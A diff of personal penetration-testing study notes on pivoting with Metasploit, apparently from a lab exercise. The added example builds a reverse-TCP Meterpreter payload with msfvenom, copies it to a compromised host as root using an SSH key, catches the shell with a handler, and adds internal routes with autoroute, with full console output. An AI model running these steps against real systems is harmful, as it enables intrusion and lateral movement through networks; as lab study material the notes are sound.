@@ -1,6 +1,6 @@
 ---
 created: 2026-09-07
-updated: 2026-09-12
+updated: 2026-10-01
 tags:
   - pivoting
 ---
@@ -378,7 +378,7 @@ portfwd delete -l 8080 -p 80 -r 172.16.5.10
 portfwd flush
 ```
 
-## Generating payloads for pivoted exploitation
+## Reverse and bind shells through the pivot
 
 - When you exploit a second target through a pivot, the payload's transport determines how the new session reaches your handler. 
 - You have two main options: `bind_tcp` and `reverse_tcp`.
@@ -464,6 +464,81 @@ exploit
 
 - When the target executes the payload, it connects to `172.16.5.1:4444` (the pivot). 
 - The pivot's reverse port forward relays the connection back through the Meterpreter channel to your handler at `10.10.11.11:4444`.
+
+>[!example]-
+>>[!note] The pivot here is set up with `sshuttle`.
+> ```bash
+> msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.3 LPORT=443 -f elf > shell.elf
+> ```
+> ```bash
+> scp -i dmz01_id_rsa shell.elf root@10.129.229.147:/tmp
+> ```
+> 
+> ```bash
+> msfconsole
+> 
+> [msf](Jobs:0 Agents:0) >> use exploit/multi/handler
+> [*] Using configured payload linux/x86/meterpreter/reverse_tcp
+> [msf](Jobs:0 Agents:0) exploit(multi/handler) >> set payload linux/x86/meterpreter/reverse_tcp
+> payload => linux/x86/meterpreter/reverse_tcp
+> [msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LHOST 10.10.14.3
+> LHOST => 10.10.14.3
+> [msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 443
+> LPORT => 443
+> [msf](Jobs:0 Agents:0) exploit(multi/handler) >> exploit
+> [*] Started reverse TCP handler on 10.10.14.3:443 
+> [*] Sending stage (1062760 bytes) to 10.129.229.147
+> [*] Meterpreter session 1 opened (10.10.14.3:443 -> 10.129.229.147:42564) at 2026-10-01 11:49:34 -0400
+> ```
+> 
+> ```
+> root@dmz01:~# chmod +x /tmp/shell.elf
+> root@dmz01:~# /tmp/shell.elf
+> ```
+> 
+> ```bash
+> (Meterpreter 1)(/root) > background
+> [*] Backgrounding session 1...
+> [msf](Jobs:0 Agents:1) exploit(multi/handler) >> use post/multi/manage/autorout
+> 
+> Matching Modules
+> ================
+> 
+>    #  Name                         Disclosure Date  Rank    Check  Description
+>    -  ----                         ---------------  ----    -----  -----------
+>    0  post/multi/manage/autoroute  .                normal  No     Multi Manage Network Route via Meterpreter Session
+> 
+> 
+> Interact with a module by name or index. For example info 0, use 0 or use post/multi/manage/autoroute
+> 
+> [*] Using post/multi/manage/autoroute
+> [*] Using configured payload linux/x86/meterpreter/reverse_tcp
+> [msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> sessions -i
+> 
+> Active sessions
+> ===============
+> 
+>   Id  Name  Type                Information   Connection
+>   --  ----  ----                -----------   ----------
+>   1         meterpreter x86/li  root @ dmz01  10.10.14.3:443 -> 10.129
+>             nux                               .229.147:42564 (10.129.2
+>                                               29.147)
+> 
+> [msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> set SESSION 1
+> SESSION => 1
+> [msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> set SUBNET 172.16.5.0
+> SUBNET => 172.16.5.0
+> [msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> set NETMASK 255.255.255.0
+> NETMASK => 255.255.255.0
+> [msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> run
+> [*] Running module against dmz01 (10.129.229.147)
+> [*] Searching for subnets to autoroute.
+> [+] Route added to subnet 10.129.0.0/255.255.0.0 from host's routing table.
+> [+] Route added to subnet 172.16.0.0/255.255.0.0 from host's routing table.
+> [+] Route added to subnet 172.17.0.0/255.255.0.0 from host's routing table.
+> [+] Route added to subnet 172.18.0.0/255.255.0.0 from host's routing table.
+> [*] Post module execution completed
+> ```
 ### Staged vs. stageless payloads
 
 - Payload naming in Metasploit distinguishes staged and stageless payloads by the separator between the transport and the handler:
